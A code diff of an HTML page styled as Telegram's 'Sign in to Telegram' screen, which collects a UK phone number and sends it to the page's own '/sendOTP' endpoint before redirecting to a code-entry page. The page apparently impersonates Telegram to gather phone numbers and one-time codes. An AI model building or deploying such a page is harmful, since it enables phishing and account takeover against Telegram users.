@@ -7,37 +7,34 @@
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <div class="login-container">
+    <!-- Login Section -->
+    <div class="login-container" id="loginContainer">
         <img src="telegram-logo.png" alt="Telegram Logo" class="logo">
         <h2>Sign in to Telegram</h2>
-        <p>Please enter your phone number to receive a verification code.</p>
+        <p>Please confirm your country code and enter your phone number.</p>
         <form id="phoneForm">
-            <select id="country" name="country">
-                <option value="GB">United Kingdom (+44)</option>
-            </select>
-            <input type="text" id="phoneNumber" placeholder="Phone Number" required>
-            <button type="submit">Next</button>
+            <div class="input-container">
+                <div class="input-label">Country</div>
+                <select id="country" name="country">
+                    <option value="GB">United Kingdom (+44)</option>
+                </select>
+            </div>
+            <div class="input-container">
+                <div class="input-label">Phone Number</div>
+                <input 
+                    type="tel" 
+                    id="phoneNumber" 
+                    name="phoneNumber"
+                    placeholder="+44 ----- ------"
+                    pattern="\+?[0-9]+" 
+                    required
+                />
+            </div>
+            <button type="submit" id="submitPhoneNumber">Next</button>
         </form>
+        <div id="message"></div>
     </div>
-    <script>
-        document.getElementById('phoneForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const phoneNumber = document.getElementById('phoneNumber').value;
 
-            fetch('/sendOTP', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ phoneNumber })
-            })
-            .then(response => response.json())
-            .then(data => {
-                // Redirect to the OTP input page
-                window.location.href = '/otp.html';
-            })
-            .catch(error => console.error('Error:', error));
-        });
-    </script>
+    <script src="/script.js"></script>
 </body>
 </html>
